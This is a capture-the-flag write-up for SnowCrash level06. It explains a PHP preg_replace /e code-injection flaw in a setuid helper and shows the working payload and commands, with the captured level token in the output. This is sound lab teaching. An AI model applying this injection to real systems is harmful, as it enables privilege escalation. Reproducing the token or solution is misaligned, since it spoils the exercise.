## --------------> Vulnerability

Privilege escalation code injection

We have an executable with suid and enhanced rights in our home directory, as well as a php script  that tells us what the executable does.

```
level06@SnowCrash:~$ ls -la level06*
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
  print $r;
?>

```

It accepts two parameters and executes the function x to retrieve the content of the first parameter, assuming the first parameter belongs to a file (see file get contents).
Then, using regular expressions, substitutions are made to this material.
The php script appears to employ the deprecated and vulnerable regex 'e' modifier.
As a result, the '/([x (.*)])/e regex will evaluate any text of the type "[x (.*)], interpret it as PHP code, and execute the 'y' function with ".*" as an argument.
This enables us to introduce code such as 'getflag'

```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$ su level07
Password:
level07@SnowCrash:~$

```
